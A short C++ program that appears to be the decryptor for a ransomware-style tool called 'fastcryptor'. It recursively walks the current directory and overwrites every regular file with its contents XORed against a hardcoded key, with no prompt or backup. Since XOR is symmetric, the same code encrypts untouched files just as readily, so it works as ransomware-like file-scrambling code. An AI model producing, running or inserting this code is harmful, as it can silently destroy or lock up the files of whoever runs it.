#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <dirent.h>
#include <cstring>

const std::string key = "fastcryptor_for_the_win_haha";

void decryptFile(const std::string& fileName)
{
    std::ifstream inputFile(fileName, std::ios::binary);
    if (!inputFile.is_open()) {
        std::cerr << "Error opening file: " << fileName << std::endl;
        return;
    }

    std::vector<char> data((std::istreambuf_iterator<char>(inputFile)), 
                           (std::istreambuf_iterator<char>()));
    inputFile.close();

    for (int i = 0; i < data.size(); i++) {
        data[i] ^= key[i % key.length()];
    }

    std::ofstream outputFile(fileName, std::ios::binary);
    if (!outputFile.is_open()) {
        std::cerr << "Error opening file: " << fileName << std::endl;
        return;
    }

    outputFile.write(data.data(), data.size());
    outputFile.close();
}

void decryptDirectory(const std::string& dirName)
{
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(dirName.c_str())) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            std::string fileName = dirName + "/" + ent->d_name;
            if (ent->d_type == DT_REG) {
                decryptFile(fileName);
            } else if (ent->d_type == DT_DIR && strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) {
                decryptDirectory(fileName);
            }
        }
        closedir(dir);
    } else {
        std::cerr << "Error opening directory: " << dirName << std::endl;
    }
}

int main()
{
    decryptDirectory(".");

    return 0;
}
